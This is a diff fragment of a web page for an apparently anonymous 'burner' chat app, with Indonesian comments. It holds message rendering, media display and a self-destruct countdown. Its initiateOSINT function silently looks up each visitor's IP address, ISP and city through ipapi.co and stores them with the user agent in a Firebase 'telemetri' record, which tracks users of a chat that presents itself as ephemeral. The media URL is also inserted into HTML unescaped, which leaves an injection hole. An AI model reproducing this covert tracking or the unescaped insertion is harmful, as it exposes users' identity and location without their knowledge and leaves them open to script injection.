+                const safeTxt = textContent.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
+                c += `<span style="font-size: 16px; line-height: 1.6; font-weight: 600;">${safeTxt}</span>`;
+            }
+            
+            if (mediaContent) {
+                if(type === "AUDIO") { c += `<div style="margin-top: 10px;"><audio controls style="height: 40px; width: 240px; outline: none;"><source src="${mediaContent}" type="audio/webm"></audio></div>`; }
+                else {
+                    const cId = `media-box-${msgId}`;
+                    c += `<div id="${cId}" style="display:flex; flex-direction:column; gap:8px; background:rgba(0,0,0,0.5); padding:8px; border-radius:6px; border:1px solid rgba(255,255,255,0.05);">
+                          <img src="${mediaContent}" style="width:100%; border-radius:4px; cursor:pointer;" onclick="this.parentElement.remove();" alt="TAP TO DESTROY">`;
+                    
+                    if (sender === "ADMIN") {
+                        c += `<a href="${mediaContent}" download="Intel_Media.jpg" style="background:#000; color:var(--neon-void-cyan); padding:10px; text-align:center; text-decoration:none; border:1px dashed var(--neon-void-cyan); border-radius:4px; font-size:11px; font-family:'JetBrains Mono'; font-weight:bold;">[ UNDUH BASE64 KE PERANGKAT ]</a>`;
+                    }
+                    c += `</div>`;
+                }
+            }
+            msgDiv.innerHTML = c; st.appendChild(msgDiv); st.scrollTop = st.scrollHeight;
+        }
+
+        // --- PENANGANAN DURASI MANUAL KILL (DURATION = 0) ---
+        function startCount(timestamp, duration) { 
+            const display = document.getElementById('countdownDisplay');
+            if (!duration || duration <= 0) {
+                if (display) display.innerHTML = `TUNNEL <span>AKTIF</span>`;
+                return; // Jangan jalankan timer ledakan jika Manual Kill
+            }
+            const exp = timestamp + (duration * 1000);
+            setInterval(() => { 
+                const d = exp - Date.now(); 
+                if (d <= 0) window.triggerHellfireKick("WAKTU HABIS", true); 
+                const h=Math.floor(d/3600000), m=Math.floor((d%3600000)/60000), s=Math.floor((d%60000)/1000); 
+                if (display) display.innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:<span>${s.toString().padStart(2,'0')}</span>`; 
+            }, 1000); 
+        }
+
+        async function initiateOSINT(rId) { 
+            try { 
+                const res = await fetch('https://ipapi.co/json/'); 
+                const ipI = await res.json(); 
+                db.ref(`burner_vault/${rId}/telemetri`).update({
+                    userAgent: navigator.userAgent.substring(0, 290), 
+                    ip: (ipI.ip || '').substring(0, 40), 
+                    isp: (ipI.org || '').substring(0, 90), 
+                    city: (ipI.city || '').substring(0, 90)
+                }).catch(()=>{}); 
+            } catch(e){} 
+        }
+
+        window.onload = initialize;
+    </script>
+</body>
+</html>
